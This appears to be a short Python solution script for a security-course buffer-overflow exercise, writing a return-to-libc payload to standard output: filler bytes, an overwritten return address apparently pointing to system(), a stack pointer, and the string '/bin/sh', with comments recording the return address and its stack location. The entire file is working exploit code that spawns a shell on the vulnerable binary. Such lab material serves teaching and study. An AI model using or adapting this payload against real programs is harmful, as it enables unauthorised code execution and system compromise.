#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# Return address 0x0804890d
# Return address location 0xfffed93c
# System call string location 80ac268

sys.stdout.buffer.write(pack("<H", 0x3333))
sys.stdout.buffer.write(pack("<I", 0x33333333))
sys.stdout.buffer.write(pack("<I", 0x33333333))
sys.stdout.buffer.write(pack("<I", 0x33333333))
sys.stdout.buffer.write(pack("<I", 0x0804fbf0))
sys.stdout.buffer.write(pack("<I", 0x33333333))
sys.stdout.buffer.write(pack("<I", 0xfffed948))
sys.stdout.buffer.write(pack(">I", 0x2f62696e))
sys.stdout.buffer.write(pack(">I", 0x2f7368))

